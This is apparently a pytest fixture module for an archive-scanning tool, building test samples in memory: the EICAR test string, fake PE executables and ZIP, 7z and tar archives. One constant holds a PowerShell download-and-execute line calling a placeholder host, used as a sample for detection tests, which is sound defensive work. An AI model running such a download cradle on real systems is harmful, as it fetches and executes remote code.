"""Hàm tạo mẫu thử dùng chung. Mọi mẫu được tạo trong bộ nhớ lúc chạy test: repo không chứa mã độc thật."""
import io
import tarfile
import zipfile

import pytest

from archive_guard.scanner import Scanner

EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").encode()


FAKE_EXE = b"MZ" + b"\0" * 126


PS_DOWNLOADER = b"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')"


def make_zip(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()


def scan(data, name="sample.zip", **kw):
    return Scanner(use_clamav=False, **kw).scan_bytes(data, name)


def rules_of(report):
    return {x.rule for f in report.files for x in f.findings}


def set_encrypted_flag(data):
    """zipfile chuẩn không tạo được ZIP có mật khẩu, nên bật cờ 'đã mã hóa' trực tiếp trong header."""
    b = bytearray(data)
    for sig, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        b[b.find(sig) + offset] |= 1
    return bytes(b)


def make_7z(files, password=None, header_encryption=False):
    py7zr = pytest.importorskip("py7zr")
    buf = io.BytesIO()
    with py7zr.SevenZipFile(buf, "w", password=password, header_encryption=header_encryption) as z:
        for name, data in files.items():
            z.writestr(data, name)
    return buf.getvalue()


def make_pe(sections):
    """PE tối giản: header DOS + PE + bảng section [(tên, dữ liệu, characteristics)]."""
    import struct
    table = 0x40 + 24
    offset = table + 40 * len(sections)
    head = bytearray(b"MZ" + bytes(0x3A) + struct.pack("<I", 0x40) + b"PE\0\0"
                     + struct.pack("<HH", 0x14C, len(sections)) + bytes(12) + struct.pack("<HH", 0, 0))
    body = b""
    for name, data, chars in sections:
        head += name.encode().ljust(8, b"\0") + struct.pack("<IIIIIIHHI", len(data), 0, len(data),
                                                           offset + len(body), 0, 0, 0, 0, chars)
        body += data
    return bytes(head) + body


def scanned_count(report):
    return sum(1 for f in report.files if f.kind != "?")


def tar_gz(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            if data is None:
                info.type = tarfile.DIRTYPE
            else:
                info.size = len(data)
            t.addfile(info, io.BytesIO(data or b""))
    return buf.getvalue()
